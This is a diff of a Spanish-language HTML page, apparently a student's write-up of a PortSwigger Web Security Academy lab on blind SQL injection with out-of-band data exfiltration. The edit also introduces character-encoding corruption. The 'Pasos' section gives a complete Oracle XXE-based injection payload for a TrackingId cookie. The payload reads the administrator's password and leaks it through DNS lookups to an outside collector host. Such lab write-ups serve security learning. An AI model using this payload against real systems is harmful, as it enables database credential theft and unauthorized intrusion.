@@ -1,10 +1,10 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="es">
 
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Lab 01 - Vulnerabilidad SQLi en cláusula WHERE</title>
+    <title>Lab 17 - Blind SQLi - exfiltraciÃ³n de datos OAST</title>
     <style>
         html,
         body {
@@ -112,7 +112,7 @@
 </head>
 
 <body>
-        <div style="padding: 20px; max-width: 1000px; margin: 0 auto; padding-bottom: 0;">
+    <div style="padding: 20px; max-width: 1000px; margin: 0 auto; padding-bottom: 0;">
         <button onclick="parent.cargaPractica('html/sql_injection.html')" style="background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%); color: #1e3a8a; border: 1px solid #e2e8f0; border-left: 5px solid #3b82f6; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 1.15rem; font-weight: 700; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); transition: all 0.4s ease;" onmouseover="this.style.transform='translateY(-4px) scale(1.02)'; this.style.boxShadow='0 8px 20px rgba(59, 130, 246, 0.2)'; this.style.borderColor='#3b82f6'" onmouseout="this.style.transform='translateY(0) scale(1)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.05)'; this.style.borderColor='#e2e8f0'">
             &#8592; Regresar al Roadmap
         </button>
@@ -121,32 +121,30 @@
         <div class="wrap">
             <div class="panel">
                 <h1>Laboratorio 17</h1>
-                <h2>Vulnerabilidad SQLi en cláusula WHERE</h2>
+                <h2>Blind SQLi - exfiltraciÃ³n de datos OAST</h2>
                 <p>PortSwigger Web Security Academy</p>
             </div>
         </div>
 
         <div class="section">
-            <h3 class="section-title">Introducción</h3>
+            <h3 class="section-title">IntroducciÃ³n</h3>
         </div>
         <div class="content-area">
-            <p class="parrafo">Este laboratorio de PortSwigger se enfoca en explotar una vulnerabilidad clásica de
-                inyección SQL (SQLi) ubicada en la cláusula <code>WHERE</code> de una consulta utilizada para filtrar
-                productos comerciales por categoría.</p>
+            <p class="parrafo">Al igual que el laboratorio anterior, lidiamos con un entorno completamente ciego y procesado de manera asincrÃ³nica, sin embargo, el objetivo no es solo confirmar la falla sino exfiltrar por ese medio la contraseÃ±a del administrador.</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Desarrollo</h3>
         </div>
         <div class="content-area">
-            <p class='parrafo'>Combinaremos el vector Out-Of-Band (OAST) para que la base de datos resuelva una direcci�n DNS que contenga en s� misma subdominios de los datos confidenciales que buscamos extraer.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p><p class='parrafo'>1. Construimos el dominio de OAST que embebe una consulta anidada hacia el secreto, ejemplo: <code>(SELECT+password+FROM+users+WHERE+username='administrator')</code>.</p><p class='parrafo'>2. Usando el payload asincr�nico pertinente: <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.colaborador.net/">+%25remote%3b]>'),'/l')+FROM+dual--</code>.</p><p class='parrafo'>3. Inspeccionamos nuestro servidor (Burp Collaborator) y veremos solicitudes DNS dirigidas hacia un subdominio parecido a <code>s3cr3t.colaborador.net</code>. Extraemos el secreto de ah�.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Explicaci�n</p><p class='parrafo'>Al anexar una extracci�n as�ncrona dentro del subdominio de nuestro servidor OAST, obligamos al sistema gestor de la base de datos a que resuelva ese secreto como una direcci�n web. Cuando nos impacta la consulta o ping, leemos qu� intentaba buscar en su registro de logs.</p>
+            <p class='parrafo'>Combinaremos el vector Out-Of-Band (OAST) para que la base de datos resuelva una direcciÃ³n DNS que contenga en sÃ­ misma subdominios de los datos confidenciales que buscamos extraer.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p><p class='parrafo'>1. Construimos el dominio de OAST que embebe una consulta anidada hacia el secreto, ejemplo: <code>(SELECT+password+FROM+users+WHERE+username='administrator')</code>.</p><p class='parrafo'>2. Usando el payload asincrÃ³nico pertinente: <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.colaborador.net/">+%25remote%3b]>'),'/l')+FROM+dual--</code>.</p><p class='parrafo'>3. Inspeccionamos nuestro servidor (Burp Collaborator) y veremos solicitudes DNS dirigidas hacia un subdominio parecido a <code>s3cr3t.colaborador.net</code>. Extraemos el secreto de ahÃ­.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>ExplicaciÃ³n</p><p class='parrafo'>Al anexar una extracciÃ³n asÃ­ncrona dentro del subdominio de nuestro servidor OAST, obligamos al sistema gestor de la base de datos a que resuelva ese secreto como una direcciÃ³n web. Cuando nos impacta la consulta o ping, leemos quÃ© intentaba buscar en su registro de logs.</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Contenido Multimedia</h3>
         </div>
         <div class="content-area" style="text-align: center;">
-            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads ejecutados exitosamente en la aplicaci�n de prueba.</p>
+            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads ejecutados exitosamente en la aplicaciÃ³n de prueba.</p>
             <div style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
                 [Espacio reservado para captura de pantalla del usuario]
             </div>
@@ -160,7 +158,7 @@
         </div>
 
         <div class="section">
-            <h3 class="section-title">Referencias Técnicas</h3>
+            <h3 class="section-title">Referencias TÃ©cnicas</h3>
         </div>
         <div class="content-area">
             <p class="citas" style="font-size: 16px;">PortSwigger. (s.f.). <i>Blind SQL injection with out-of-band data exfiltration</i>. Web Security Academy. Recuperado de https://portswigger.net/</p>
@@ -169,8 +167,3 @@
 </body>
 
 </html>
-
-
-
-
-
